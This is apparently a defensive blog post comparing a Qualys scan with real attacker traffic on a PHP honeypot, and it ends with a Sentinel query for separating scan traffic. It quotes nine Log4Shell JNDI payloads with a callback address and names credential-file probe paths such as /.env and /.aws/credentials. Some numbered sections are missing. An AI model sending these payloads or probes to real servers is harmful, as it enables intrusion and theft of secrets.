31 Minutes of Qualys vs. 18 Days of Attackers: Same Server, Different Questions

A Qualys vulnerability scan sent 11,262 requests to our PHP honeypot in 31 minutes. Real attackers sent 10,509 in the 18 days the honeypot was online. We compare them category by category: the scanner never asked for /.env and never tested PHP2Shell, while attackers never tried Log4Shell. What that means for how you read your own scan reports.

Key Sections: Summary · The Scan · Side by Side · What the Scanner Skipped · What Attackers Skipped · How Qualys Tests · Telling Scans From Attacks · What to Take From This

Part of the PHP honeypot series. Data: nginx request log from vm-php-cve-lab, 22 October – 15 November 2026 (UTC; the VM was switched off from 9 to 15 November). The Qualys requests are quoted from our Microsoft Sentinel copy of the log, which replaced every ; with a space; the attacker numbers use the exact log.

1. Summary

On 23 October, the day after the honeypot went live, a Qualys vulnerability scan ran against it from 52.176.19.239: 11,262 requests between 2026-10-23 02:18:49 and 02:49:34 UTC. In the 18 days the honeypot was online, 1,148 other addresses sent 10,509 requests. Same server, same software, so a fair comparison of what a commercial scanner checks against what attackers actually try:

  • The scanner requested 6,078 different paths; attackers 2,050. Only 212 paths appear in both.
  • Attackers' favourite target was secrets: 3,307 requests for .env, .git and config files. The scanner sent 170, and not one of them was for .env.
  • Two days after PHP2Shell was disclosed, the scan contained no PHP2Shell test. Attackers sent the first one five minutes after the scan finished.
  • The scanner spent 45 requests on Log4Shell and 807 on Java enterprise software. Attackers sent 0 Log4Shell requests in 18 days.

2. The Scan

11,262 requests in 31 minutes, about 6 per second, with a peak minute at 02:29 UTC, 2562 requests. Methods: GET 10,646, POST 407, (none) 147, HEAD 15, PUT 11, OPTIONS 7, TRACE 6, TRACK 4. Answers: 404 x9,364, 200 x1,538, 400 x328, 405 x19, 501 x5, 505 x4.

The scan identifies itself in the payloads, not the headers. 457 requests contain a QUALYS marker, such as QUALYSTEST, QUALYSXSS, QUALYS_TEST_733480 or a QUALYS prefix followed by what look like the scanner's own check IDs (QUALYS730141, QUALYS13785 and so on). A server that echoes one back, or runs a command that prints it, has the vulnerability.

The shapes are different. More than half of the scan is "other path probes": thousands of product-specific URLs, each asking "is product X installed here?". Attackers ask far fewer questions, and a third of everything they sent is one question: "do you have a secrets file I can download?"

A note on the "PHP2Shell category" row. Our classifier puts multipart POSTs there. For attackers those were PHP2Shell attempts (covered in the PHP2Shell post). The scanner's 29 multipart POSTs in it were Apache Struts 2 OGNL injections in the upload file name, against 15 different .action URLs. None of the scanner's requests contained the PHP_SESSION_UPLOAD_PROGRESS field that PHP2Shell uses (0 requests, against 39 from attackers with the field in a logged body).

The scan requested 0 paths containing .env. Attackers requested such paths 2010 times. .env files hold database passwords, API keys and cloud credentials for Laravel, Node and many other frameworks, and a web server that serves one is giving away the keys to everything behind it. The secrets post shows what those requests look like.

The scan may cover this in a different way. Scanners often check for exposed files through a separate "sensitive content" module or a crawl, and our scan profile may simply not have had it enabled. We do not have the scan configuration or report, only what arrived at the server. But the result is the same: had this server exposed /.env, this scan would not have found it, and the first attacker to ask would have.

The others in the list tell the same story at smaller scale. /.git/HEAD and /.aws/credentials are credential leaks. /wp-includes/version.php, /readme.html and /license.txt are WordPress version fingerprints that one attacker tool repeated over a hundred times. /nope.php is a deliberately missing page, used to learn what the server's "not found" looks like.

PHPUnit shows the difference in depth. The scan tried the PHPUnit eval-stdin.php exploit 18 times on 17 paths. Attackers tried it 430 times on 41 paths: they keep a much longer list of the places frameworks bury their vendor folder. Details are in the legacy PHP RCE post.

5. What Attackers Skipped

Log4Shell. The scan injected JNDI lookups into URLs and bodies (URL 36, body 9) using nine different lookup protocols:

${jndi:corba://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:dns://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:hxxp://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:iiop://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:ldap://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:ldaps://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:nds://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:nis://172.27.44.249:&lt;port&gt;/QUALYSTEST}
${jndi:rmi://172.27.44.249:&lt;port&gt;/QUALYSTEST}

Attackers sent none in 18 days. Log4Shell is still exploited, but against Java applications, and the scanners that look for it pick targets that look like Java. A server that answers with X-Powered-By: PHP is not on their list. The commercial scanner, which tests everything on every target, does not make that choice.

The callback address in these lookups is 172.27.44.249, a private address. A vulnerable server would try to connect to it and fail, unless it were on the same private network as the scanner. For an internet-facing target such as ours, this check could not have produced a finding even if the target were vulnerable, unless the scanner also had another way to detect it. Again, we cannot see the scanner's side.

Java, VPNs and Microsoft. The scan sent 807 requests for Java enterprise software, 343 for VPN and edge appliances and 241 for Exchange, SharePoint and IIS. Attackers sent 112, 74 and 73, many of them from two addresses that ran the same broad Nmap-based product fingerprint two weeks apart. Same reason: attackers who go after Citrix or Fortinet scan for Citrix and Fortinet first, and this server is neither.

SQL injection and code injection. The scan sent 30 SQL injection and 104 PHP code-injection tests against the site's own pages. Attackers sent no SQL injection, and the only four requests our rules filed as code injection were product probes with a cmd= parameter. Generic injection testing needs a real application with parameters; mass attackers prefer exploits that work on a known product with one request.

7. Telling Scans From Attacks

For a SOC, an authorised scan is noise that looks exactly like an attack, and it lands in the same tables. In our data it was 52% of all web requests. Three ways to separate it:

  • Source address. Put your scanner addresses in a Sentinel watchlist and exclude them, rather than hard-coding them in each rule.
  • Markers. Qualys payloads contain QUALYS. That is useful for confirming that an alert was the scanner, but do not suppress on it: anyone can put that string in a request.
  • Timing. A scan is thousands of requests in minutes from one address. Real attackers' traffic here was spread over days and a thousand addresses.
let Scanners = _GetWatchlist('AuthorisedScanners') | project ScannerIp = tostring(SearchKey);
Syslog
| where SyslogMessage startswith "php_http: "
| extend j = parse_json(substring(SyslogMessage, 10))
| extend Client = tostring(j.client), Req = tostring(j.request), Body = tostring(j.body)
| extend IsScanner = Client in (Scanners)
| extend HasMarker = Req has "QUALYS" or Body has "QUALYS"
| summarize Requests = count(), WithMarker = countif(HasMarker) by Client, IsScanner
| where WithMarker > 0 and not(IsScanner)   // marker from an address that is not your scanner: someone copying it, or a scanner you did not know about
| order by Requests desc

8. What to Take From This

  • A clean scan report is an answer to the scanner's questions, not the attackers'. This scan never asked for /.env. Check that your scanner's profile includes sensitive-file discovery, or test for it separately: a short list of paths like the one in section 4 is enough.
  • New vulnerabilities reach attackers before they reach scan profiles. Two days after disclosure the scan had a React2Shell check (that bug was almost a year old) but no PHP2Shell check. Attackers had both. For the first days after a disclosure, rely on patching and your own targeted check, not the next scheduled scan.
  • Make sure out-of-band checks can call back. A Log4Shell or SSRF check whose callback address is private cannot succeed against an internet-facing target unless the scanner sees the callback another way. Ask your vendor how a scan from outside detects it.
  • Use the scanner's breadth for what it is good at: finding products you did not know you had. Attackers will only ask about the products they can exploit, and they will ask often.
  • Keep scan traffic out of attack statistics. Without separating it, more than half of this honeypot's "attacks" would have been one Qualys scan.
